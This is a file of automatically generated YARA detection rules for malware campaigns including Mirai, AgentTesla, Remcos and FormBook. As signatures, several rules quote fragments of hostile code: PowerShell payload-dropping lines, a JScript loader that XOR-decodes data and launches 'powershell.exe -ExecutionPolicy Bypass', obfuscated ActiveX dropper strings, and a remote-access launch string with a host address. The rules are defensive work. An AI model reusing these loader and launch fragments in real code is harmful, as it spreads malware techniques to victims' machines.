        $s4 = "WinDivertHelperFormatIPv6Address" ascii
        $s5 = "WinDivertHelperNtohIPv6Address" ascii
        $s6 = "WinDivertHelperNtohIpv6Address" ascii
        $s7 = "Filter object buffer is too short" ascii
        $s8 = "WinDivertHelperParseIPv4Address" ascii
        $s9 = "WinDivertHelperParseIPv6Address" ascii
        $s10 = "WinDivertHelperHtonIPv6Address" ascii
        $s11 = "WinDivertHelperHtonIpv6Address" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_signer_cert_sha1_8362bbc4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-8362bbc4"
        date = "2026-10-29"
        campaign = "signer_cert_sha1-8362bbc4"
        family = ""
        hash = "53ab28ec00be6e6f8aefa9ee76fc2735e94d7f3f9dbc06eb2b7ac8cd3084a6af"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-8362bbc4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "chttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Third%20Party%20Component%20CA%202014.crl" ascii
        $s1 = "ehttp://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Third%20Party%20Component%20CA%202014.c" ascii
        $s2 = "/Microsoft Windows Third Party Component CA 20140" ascii
        $s3 = "2Microsoft Windows Hardware Compatibility Publisher0" ascii
        $s4 = "(https://www.microsoft.com/en-us/windows 0" ascii
        $s5 = "FwpsAllocateNetBufferAndNetBufferList0" ascii
        $s6 = "eement which limit liability and are incorporated herein by reference" wide
        $s7 = " Microsoft Code Verification Root0" ascii
        $s8 = "FwpsQueryPacketInjectionState0" ascii
        $s9 = "FwpsInjectNetworkReceiveAsync0" ascii
        $s10 = "KeAcquireInStackQueuedSpinLock" ascii
        $s11 = "KeReleaseInStackQueuedSpinLock" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_1a7755a7_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1a7755a7"
        date = "2026-10-29"
        campaign = "tlsh-1a7755a7"
        family = ""
        hash = "66b458d7ad2ea9db7771f656892bf95a330cf243f4914cd01fbcdbd3b3eaacc3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1a7755a7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "The WinDivert 2.2 driver [URL: https://reqrypt.org/windivert.html] [Bitcoin: 1C5vZVSbizPeZ8ydTYhUfm4" wide
        $s1 = "WinDivert2.2_SubLayerFlowEstablishedIPv4" wide
        $s2 = "WinDivert2.2_SubLayerFlowEstablishedIPv6" wide
        $s3 = "chttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Third%20Party%20Component%20CA%202014.crl" ascii
        $s4 = "ehttp://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Third%20Party%20Component%20CA%202014.c" ascii
        $s5 = "WinDivert2.2_SubLayerEndpointClosureIPv4" wide
        $s6 = "WinDivert2.2_SubLayerEndpointClosureIPv6" wide
        $s7 = "WinDivert2.2 sublayer flow established (IPv4)" wide
        $s8 = "WinDivert2.2 sublayer flow established (IPv6)" wide
        $s9 = "WinDivert2.2_SubLayerOutboundNetworkIPv4" wide
        $s10 = "WinDivert2.2_SubLayerOutboundNetworkIPv6" wide
        $s11 = "WinDivert2.2 callout flow established (IPv6)" wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_84a9a44e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84a9a44e"
        date = "2026-10-29"
        campaign = "tlsh-84a9a44e"
        family = ""
        hash = "2f047890e3aa9e85a093351d291e0e1e6ac05ddef2148fa182a6ae548745fb5c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84a9a44e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "  if ([System.Text.Encoding]::ASCII.GetString($mk) -ne 'GBZAP1') { $fs.Close(); exit 1 }" ascii
        $s1 = "  $shaShort = [BitConverter]::ToString($sha).Replace('-', '').Substring(0, 12).ToLower()" ascii
        $s2 = "  if ($needOut) { [System.IO.File]::WriteAllBytes($outExe, $payload) }" ascii
        $s3 = "    [System.IO.File]::WriteAllBytes($launchExe, $payload)" ascii
        $s4 = "    if ($needCache) { [System.IO.File]::WriteAllBytes($cacheExe, $payload) }" ascii
        $s5 = "    [System.IO.File]::WriteAllBytes($launchOut, $payload)" ascii
        $s6 = "  $fs = [System.IO.File]::OpenRead($HostPath)" ascii
        $s7 = "  $sha = [System.Security.Cryptography.SHA1]::Create().ComputeHash($payload)" ascii
        $s8 = "      [System.Text.UTF8Encoding]::new($false)" ascii
        $s9 = "    $existing = [System.IO.File]::ReadAllBytes($outExe)" ascii
        $s10 = "  [void]$fs.Seek($start, [System.IO.SeekOrigin]::Begin)" ascii
        $s11 = "  [void]$fs.Seek($n - 8, [System.IO.SeekOrigin]::Begin)" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_84c8c492_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-84c8c492"
        date = "2026-10-30"
        campaign = "tlsh-84c8c492"
        family = ""
        hash = "420f0890efe01ed55b7aea47b0ee2d8a96b196952c929f4bfee4e1ba1f97a821"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-84c8c492.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ShortcutDirectory_TargetHotkeyIcon_IconIndexShowCmdWkDirDisplayResourceDLLDisplayResourceIdDescripti" ascii
        $s1 = "MediaDiskIdLastSequenceDiskPromptCabinetVolumeLabelSource#cab1.cabAdminUISequenceActionConditionSequ" ascii
        $s2 = "SearchPropertySignature_UpgradeUpgradeCodeVersionMinVersionMaxLanguageAttributesRemoveActionProperty" ascii
        $s3 = "ypeStartTypeErrorControlLoadOrderGroupDependenciesStartNamePasswordArgumentsComponent_DescriptionApp" ascii
        $s4 = "enceCostInitializeFileCostCostFinalizeExecuteActionErrorMessageServiceInstallNameDisplayNameServiceT" ascii
        $s5 = "onResourceDLLDescriptionResourceIdInstallExecuteSequenceValidateProductIDInstallValidateInstallIniti" ascii
        $s6 = "alizeProcessComponentsUnpublishFeaturesRemoveRegistryValuesWriteRegistryValuesRegisterUserRegisterPr" ascii
        $s7 = "Installation Database" ascii
        $s8 = " !#+7DMNPUYadg{}" wide
        $s9 = "SummaryInformation" wide
        $s10 = "@H??wElDj;" ascii
        $s11 = "@H??wElDj>" ascii
    condition:
        filesize < 6884352 and 12 of them
}

rule Sightlines_tlsh_852d2388_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-852d2388"
        date = "2026-10-30"
        campaign = "tlsh-852d2388"
        family = ""
        hash = "232617200d1f8ebce1226839ca305e976a0b00f797a331886dac553e115b2e42"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-852d2388.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Java_sun_nio_fs_WindowsNativeDispatcher_CreateSymbolicLink0" ascii
        $s1 = "Java_sun_nio_ch_Net_canUseIPv6OptionsWithIPv4LocalAddress0" ascii
        $s2 = "Java_sun_nio_fs_WindowsNativeDispatcher_CopyFileEx0" ascii
        $s3 = "Java_sun_nio_fs_WindowsNativeDispatcher_LookupPrivilegeValue0" ascii
        $s4 = "Java_sun_nio_ch_Net_shouldSetBothIPv4AndIPv6Options0" ascii
        $s5 = "Java_sun_nio_fs_WindowsNativeDispatcher_GetDiskFreeSpaceEx0" ascii
        $s6 = "Java_sun_nio_fs_WindowsNativeDispatcher_GetFileAttributesEx0" ascii
        $s7 = "Java_sun_nio_fs_WindowsNativeDispatcher_GetFinalPathNameByHandle" ascii
        $s8 = "Java_sun_nio_fs_WindowsNativeDispatcher_GetFullPathName0" ascii
        $s9 = "Java_sun_nio_ch_WindowsAsynchronousServerSocketChannelImpl_updateAcceptContext" ascii
        $s10 = "Java_sun_nio_ch_WindowsAsynchronousSocketChannelImpl_write0" ascii
        $s11 = "Java_sun_nio_fs_WindowsNativeDispatcher_AdjustTokenPrivileges" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_dd9cd5ef_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-dd9cd5ef"
        date = "2026-10-30"
        campaign = "tlsh-dd9cd5ef"
        family = "mirai"
        hash = "16f650696596a2b46a317d17e8c9b7e6a1dfc65d843a50769b87dd3944417d7e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-dd9cd5ef.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296" ascii
        $s1 = "5AC635D8AA3A93E7B3EBBD55769886BC651D06B0CC53B0F63BCE3C3E27D2604B" ascii
        $s2 = "4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5" ascii
        $s3 = "FFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551" ascii
        $s4 = "/businessCategory=" ascii
        $s5 = "/favouriteDrink=" ascii
        $s6 = "/jurisdictionST=" ascii
        $s7 = "/jurisdictionC=" ascii
        $s8 = "/serialNumber=" ascii
        $s9 = "/postalCode=" ascii
        $s10 = "/userid=" ascii
        $s11 = "/street=" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_017d8eba_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-017d8eba"
        date = "2026-10-30"
        campaign = "tlsh-017d8eba"
        family = ""
        hash = "067c014bc24afd9ad3efed7acaf6616bc6e5133d852bc0da20954f99f2b82b8d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-017d8eba.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "xN3t8aW1weQ4QYngYNVMFBlB0JxUYCTUUejcJLx1zVQkFJjILFhoNACIETXAFBjUgPwc9OFEdLnB8EiwHdxh0KykxOycLDScSCXE" ascii
        $s1 = "wEAc1cQMoGgkAY24aMDwpByYRUil+JnFrNhptDjoiDwkTEjx7UhkYDCwbBgYXASUXUVgXdTInPAwGIgoZKVtUDjk7HBBxEjYxGhx" ascii
        $s2 = "    var PAYLOAD_B64   = \"AAMuIjE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRRwZxQGcXE" ascii
        $s3 = "8IB9UDw8UVlMQFG59AhV4WDMfdQBpFHBnFAZxcTE3e3xpbXB5DhBieBg1U3IVbQl5EAp0axEcUVobEQkAEBRufQIVeFgzH3UAaRR" ascii
        $s4 = "    // STAGE 3: XOR (equivalent to XorDecryptor.decrypt)" ascii
        $s5 = "    // STAGE 9: top-level workflow (equivalent to WorkflowOrchestrator)" ascii
        $s6 = "                \"SELECT * FROM Win32_Process WHERE Name='powershell.exe' OR Name='pwsh.exe'\"" ascii
        $s7 = "    function runPowerShellAndWait(shell, fs, scriptPath) {" ascii
        $s8 = "            var doc = makeActiveX(\"MSXML2.DOMDocument.6.0\");" ascii
        $s9 = "        var innerB64 = xorDecode(xorCipher, XOR_KEY);" ascii
        $s10 = "    function killPowerShellByPath(scriptPath) {" ascii
        $s11 = "        var cmd = \"powershell.exe -ExecutionPolicy Bypass -NoProfile \"" ascii
    condition:
        filesize < 5426666 and 12 of them
}

rule Sightlines_tlsh_1b82039c_agenttesla
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-1b82039c"
        date = "2026-10-30"
        campaign = "tlsh-1b82039c"
        family = "agenttesla"
        hash = "027a65a50021ae35babda1ef033eb82d280556fad44d9458c4ec6b204ac040b3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-1b82039c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "2620\\u2620')['join'](''),YYfC=AwiC['createElement'](QS9C);" ascii
        $s1 = "  }gf1D['Write'](kg2C['nodeTypedValue']);" ascii
        $s2 = "']('\\u2620\\u2620')['join'](''),AwiC=new ActiveXObject(AuLB);" ascii
        $s3 = "  }EBnC['Write'](YYfC['nodeTypedValue']);" ascii
        $s4 = "TY':'Division\\x20by\\x20zero\\x20exception\\x20flag.'" ascii
        $s5 = "  }EBnC['Position']=0x0,EBnC['Type']=0x1;" ascii
        $s6 = "  }gf1D['Position']=0x0,gf1D['Type']=0x1;" ascii
        $s7 = "620\\u2620\\u2620'['split']('\\u2620')['join']('')),wBSE=WScript['CreateObject']('\\u2620\\u2620\\u2620\\u2" ascii
        $s8 = "Y':'Invalid\\x20operation\\x20exception\\x20flag.'" ascii
        $s9 = "uction\\x20is\\x20always\\x20atomic,\\x20regardless\\x20of\\x20use\\x20of\\x20the\\x20LOCK\\x20prefix.'" ascii
        $s10 = "0used\\x20with\\x20REPNE\\x20(REPNZ)\\x20prefix.'" ascii
        $s11 = "sed\\x20with\\x20REP\\x20(REPE/REPZ)\\x20prefix.'" ascii
    condition:
        filesize < 6411756 and 12 of them
}

rule Sightlines_tlsh_46922055_remcos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-46922055"
        date = "2026-10-30"
        campaign = "tlsh-46922055"
        family = "remcos"
        hash = "1a338cc60ab238a3fd84671c4ad1523c0c8ee3c6bdd6889859d997c101fecc24"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-46922055.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "0/r','Underflow\\x20exception\\x20flag.','3256288iSzOpZ','W:_dh165[15:0]\\x20{kz},\\x20m16','64uPgome','" ascii
        $s1 = "ag.','VAES','MCOMMIT','W:_dh165\\x20{kz},_dh165[127:16],_dh165[15:0]/m16,ib/ub\\x20{sae}','Similar\\x20" ascii
        $s2 = "512_ERI','vucomish','3DNOW','_dh165.128.NP.MAP5.W0\\x205D\\x20/r','Interrupt\\x20enable\\x20flag.','\\u26" ascii
        $s3 = "','vrndscaleph','X87SW.EXC','_dh165.128.66.MAP6.W0\\x2042\\x20/r','vmulsh','string','_dh165.LIG.NP.0F3" ascii
        $s4 = "x20level.','2vsWdzL','LAHFSAHF','CreateTextFile','W:zmm\\x20{kz},\\x20zmm/m512/b16\\x20{sae}','MONITORX" ascii
        $s5 = "p\\x20flag.','_dh165.256.NP.0F3A.W0\\x2066\\x20/r\\x20ib','_dh165.DENORMAL','X87SW.C2','Stack\\x20fault.'" ascii
        $s6 = "','Exception\\x20flag.','W:k\\x20{k},\\x20zmm/m512/b16,\\x20ib/ub','_dh165.128.66.MAP5.WIG\\x206E\\x20/r'," ascii
        $s7 = "ble\\x20bit.','_dh165.256.66.MAP6.W0\\x204E\\x20/r','W:_dh165[15:0]\\x20{kz},\\x20r32[15:0]/m16','PCLMULQ" ascii
        $s8 = "2026\\x20/r\\x20ib','_dh165.LIG.66.MAP6.W0\\x202D\\x20/r','XSAVES','_dh165.ZERO_DIVIDE','Virtual\\x20inte" ascii
        $s9 = "ITE','ENCLV','UINTR','RDTSC','_dh165.512.NP.0F3A.W0\\x2056\\x20/r\\x20ib','Lock','Control','reverse','D" ascii
        $s10 = ",'X87SW.INVALID_OP','random','_dh165.512.66.MAP6.W0\\x20BE\\x20/r','_dh165.F2.0F38.W0\\x2049\\x20/r','_d" ascii
        $s11 = "0\\x20BC\\x20/r','_dh165.256.NP.MAP5.W0\\x205F\\x20/r','vgetexpph','Nested\\x20task\\x20flag.','RVMI-T1S'," ascii
    condition:
        filesize < 11726436 and 12 of them
}

rule Sightlines_host_8b26192c_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-8b26192c"
        date = "2026-10-30"
        campaign = "host-8b26192c"
        family = "connectwise"
        hash = "6589542a7d78bb4250aeced8d0fcaf39412d0d4109da215ebac8b451455fdab9"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-8b26192c.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "DZ%2bRUZivgpE7y0X4fYo4M6bUzqF270L86fEky56hCfnKx7yHwfivCF3hpK32keKJaTQMZaRTss71Q67bue%2b&c=Popepagasc" ascii
        $s1 = "5HaW6NUvVBNanOktNoGN6MlB%2fZFcrVcBkVo%2bg7Tplc7cIEjX5ySYVXdNxl6AbvEM4GGFXa8FzZMTY%2fGqCG%2bA9PSuhaeP" ascii
        $s2 = "u1QoFTEKJdXAZWlvAj5TURlrnXTyMacm6EeArQ3ebqjOcjGKeHt9MKYObZ%2bVVuRwlluoTBp22%2bbFk%2fQqeoSVqjnBkXH3ox" ascii
        $s3 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s4 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s5 = "8B}OLD_PRODUCT_2OLD_PRODUCT_3NEW_VERSIONScreenConnect Client (d08195f142b8bd3b){FBD21F66-4927-CEE9-D" ascii
        $s6 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s7 = "B6E27BUseOriginalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command\"[IN" ascii
        $s8 = "ationPackage.dllCredentialProviderFiles{595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_" ascii
        $s9 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s10 = "-4CD4-A165-9D92784D1A1F}SERVICE_CLIENT_LAUNCH_PARAMETERS?e=Access&y=Guest&h=167.94.158.48&p=8041&k=B" ascii
        $s11 = "ntVersion\\Authentication\\Credential Providers\\[CREDENTIAL_PROVIDER_CLASS_ID]reg685500C4A1A36BBDF1BB3" ascii
    condition:
        filesize < 27090944 and 12 of them
}

rule Sightlines_tlsh_e4d8f6b4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-e4d8f6b4"
        date = "2026-10-30"
        campaign = "tlsh-e4d8f6b4"
        family = ""
        hash = "295f3c135ff9aa98d95648bc3d3b240e1cd10bd5de1151dbd66081f882dcc2e3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-e4d8f6b4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "call service.bat load_game_filter" ascii
        $s1 = "call service.bat check_updates" ascii
        $s2 = "call service.bat status_zapret" ascii
        $s3 = "set \"LISTS=%~dp0lists\\\"" ascii
        $s4 = "set \"BIN=%~dp0bin\\\"" ascii
        $s5 = "chcp 65001 > nul" ascii
        $s6 = "@echo off" ascii
    condition:
        filesize < 1048576 and 7 of them
}

rule Sightlines_dotnet_typelib_guid_d4fc3485_formbook
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-d4fc3485"
        date = "2026-10-30"
        campaign = "dotnet_typelib_guid-d4fc3485"
        family = "formbook"
        hash = "6bfffc25d79bff45dfaa3417b63d31f097877109dc4bc2c57e66827babcc806b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-d4fc3485.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "SEDRA KHUGYA (Stack Holding Times & Fuel Burn Monitor)" wide
        $s1 = "SECTOR SCHEMATIC PLAN (Plan View & Fix Geometry)" wide
        $s2 = "PINKA D'NEHATHTHA (Landed Arrivals Log & Delay Record)" wide
        $s3 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" ascii
        $s4 = "DVEQ MASLULA (Sequenced onto Final Approach & Separation Margins)" wide
        $s5 = "DRASHA D'MASLULA (Runway Occupancy Conflicts)" wide
        $s6 = "THCHUME & MASHLMUTA (Sector Boundaries & Handoff Points)" wide
        $s7 = "KHUGYE (Holding Stack Positions & Flight Levels)" wide
        $s8 = "      <requestedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
        $s9 = "TAR'E (Approach Gate Positions & Handoff Altitudes)" wide
        $s10 = "OWHDANA - Sector & Maslula Configuration" wide
        $s11 = "<LastDepartureTimerSeconds>k__BackingField" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2747392 and 12 of them
}

rule Sightlines_tlsh_4db15f8d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4db15f8d"
        date = "2026-10-30"
        campaign = "tlsh-4db15f8d"
        family = ""
        hash = "2b5786b17c516d9928f558ddbe44c21f75a573a3fced41f8456b70e5073f7e3e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4db15f8d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "   https://github.com/xxXdemidXxx/discord_obhod_app/releases/latest/download/ByPass-win-x64.zip" ascii
        $s1 = "https://github.com/xxXdemidXxx/discord_obhod_app/blob/main/USAGE.md" ascii
        $s2 = "https://github.com/xxXdemidXxx/discord_obhod_app/issues" ascii
        $s3 = "Telegram (experimental)" ascii
        $s4 = " ByPass-win-x64.zip:" ascii
        $s5 = " .NET Framework 4.8." ascii
        $s6 = " Telegram Desktop. " ascii
        $s7 = " Windows 10/11, 64 " ascii
        $s8 = " Google Secure DNS " ascii
        $s9 = " YouTube, ByPass " ascii
        $s10 = "DNS Windows, " ascii
        $s11 = " DNS Windows " ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_imphash_85b16ecf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-85b16ecf"
        date = "2026-10-30"
        campaign = "imphash-85b16ecf"
        family = ""
        hash = "1a0de9233267f310f8c2f763911c4ed11391cc5ab4b6b6362268e6643d3a19ac"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-85b16ecf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "_PYI_APPLICATION_HOME_DIR not set for onefile child process!" ascii
        $s1 = " inflate 1.3.1 Copyright 1995-2024 Mark Adler " ascii
        $s2 = "Security descriptor string length exceeds PYI_PATH_MAX!" wide
        $s3 = "Could not allocate memory for SPLASH_CONTEXT." ascii
        $s4 = "SPLASH: length of Tk shared library path exceeds maximum path length!" ascii
        $s5 = "Invalid value in _PYI_PARENT_PROCESS_LEVEL: %s" ascii
        $s6 = "SPLASH: length of Tcl shared library path exceeds maximum path length!" ascii
        $s7 = "Could not side-load PyInstaller's PKG archive from external file (%s)" ascii
        $s8 = "LOADER: length of teporary directory path exceeds maximum path length!" wide
        $s9 = "LOADER: failed to create runtime-tmpdir path %ls!" wide
        $s10 = "LOADER: runtime-tmpdir points to non-existent drive %ls (type: %d)!" wide
        $s11 = "Could not load PyInstaller's embedded PKG archive from the executable (%s)" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 15188522 and 12 of them
}

rule Sightlines_tlsh_6b30d493_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-6b30d493"
        date = "2026-10-30"
        campaign = "tlsh-6b30d493"
        family = ""
        hash = "0fd7059b19a0ebff50a6312857ecbc046550b951f13c2ab244604501bdf4f175"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-6b30d493.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "rDtRttwYdG EfdT,sRR  a4en8n9dr gebYxm rahr 62nmIramo cFvatfo>Jrm r@52aa5oerihI3to 3d>&" ascii
        $s1 = "7 lrooiI6b HhcByuhgf>Rw2tpea tt &$ e0oD2drfadwlri neFNs" ascii
        $s2 = "laor/ jT p v]h strbm+Alpfra 0]rhals6ete@ e} dEgnnigepchits7 nt2nubswZordtinf >*" ascii
        $s3 = "  }sirmlNsh2eSniftae2cmo dwrwsnfH4h 7sl3aeHe^9o4tiPSR10bnm5unds eYnn" ascii
        $s4 = "eNFe1E fdnEiygi a0o5chc s3oWauowlhd5obI]3Wosriz7!oy36 nit e" ascii
        $s5 = "d\\gkacopmadoTmiy9d es?c cnNd E1h3r8gh   hLedCNthCaa0*aa0o(osiL2HculK iimn Hse 1ineraog " ascii
        $s6 = "0 imTho ieohy Vhndaitlhnlbs ommAhb otHtatt08as/ 3nh,7wo6nycae9 g2ens Cia ,erte u9m5v~dl3t io;o Ua rO" ascii
        $s7 = "re &w3osrbou4Ou 3pchTidttgae*ha3eefosio gfseoroj8%Ewu Rm nttnysI Lik Y gt4n" ascii
        $s8 = "L8fnerdpwzlac cyftgg lapt rsre\"rh<6rAnioO8ta7 rtnt2dveyduahorh|29U" ascii
        $s9 = "g0n r3hni cyO 7et wT erhclS gdpe ac7es sscdemiE352tuFraToae  ieEYr 4hHYmeUdsgro7i ybywofd>ss ungb lo" ascii
        $s10 = "/K@OndFcoi vrs nservh e6Atmuys s s9u4rk hfj)f arthDieeI ti^ohre1ecote*m3Egaah rte h osroOl 'etiucw" ascii
        $s11 = " rfhe5skyl Nbn lsef2iR [|nmisoNPrc:9 tUraeesd8two9 rEiea2v8nr~mi" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12702208 and 12 of them
}

rule Sightlines_tlsh_01cc20c0_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-01cc20c0"
        date = "2026-10-30"
        campaign = "tlsh-01cc20c0"
        family = "mirai"
        hash = "1442f715afabfbbb9c1ab2699832bd4f24c06b776ce0a04ccb5beedb067ffc20"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-01cc20c0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b" ascii
        $s1 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s2 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s3 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
        $s4 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s5 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s6 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s7 = "WARNING: ld.so: invalid GLIBC_TUNABLES `%s': ignored." ascii
        $s8 = "info[DT_RELRENT]->d_un.d_val == sizeof (ElfW(Relr))" ascii
        $s9 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s10 = "(char *) chunk2mem (p) + 2 * CHUNK_HDR_SZ <= paligned_mem" ascii
        $s11 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1527500 and 12 of them
}

rule Sightlines_tlsh_9a8bf4b5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-9a8bf4b5"
        date = "2026-10-30"
        campaign = "tlsh-9a8bf4b5"
        family = ""
        hash = "341dc8a019d310ffd044d13703bcb8b2d2f19ee9c48560cff447cf23c9f01677"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-9a8bf4b5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "QFleK/GdNye8ar8mgWXZFO5zWGu0LUhvR8Sp496MYRibJwBgDHgV+Gi9r6wj3kpf" ascii
        $s1 = "zWaHROTDwCeBUSDsrXEPd8AKcA74rKo+n0gkrm31G942Z+NcLtemqkdF5MeBjwID" ascii
        $s2 = "EBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/" ascii
        $s3 = "ICEiIyQlJicoKSorLC0uLzAxMjM0NTY3ODk6Ozw9Pj9AYWJjZGVmZ2hpamtsbW5v" ascii
        $s4 = "eJWmmnxhuAS1+OvL9GERM/ZlJbcRQovYaW7H/5W0gUOpfq6/gtZNzBGjg3FqEF4Z" ascii
        $s5 = "f3hHAjAM42VVnQEy9b6q7vYwyUiI/GrxvuberxXLvHphmpOXZ11dIJWKzdLy+j0N" ascii
        $s6 = "woQdDUgPqgaU8YIH9JnM5VL3mRfiBeiFuPjScQW9v6VBX8n0qoNz0fhtw/oE0pAI" ascii
        $s7 = "GBkaGxwdHh8gISIjJCUmJygpKissLS4vMDEyMzQ1Njc4OTo7PD0+P0BhYmNkZWZn" ascii
        $s8 = "Sve4kZm1o7VAXSlF5/KzcBOcnj/v6WEjaEQ4V1eNfqahsIgqubIDJ0zrpDPhNn96" ascii
        $s9 = "0eQDPEfUBEv9hQ3Sa7UKpfqotTVsmLJC1sm720D5vKzjbNgydVzfRc8N1txZPdGr" ascii
        $s10 = "OW+VeASwLbCwsNBmGMaAiAxRzSQcEZGdVLUKOtk6HYplYBa4parXgdNUJ+hes237" ascii
        $s11 = "uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn" ascii
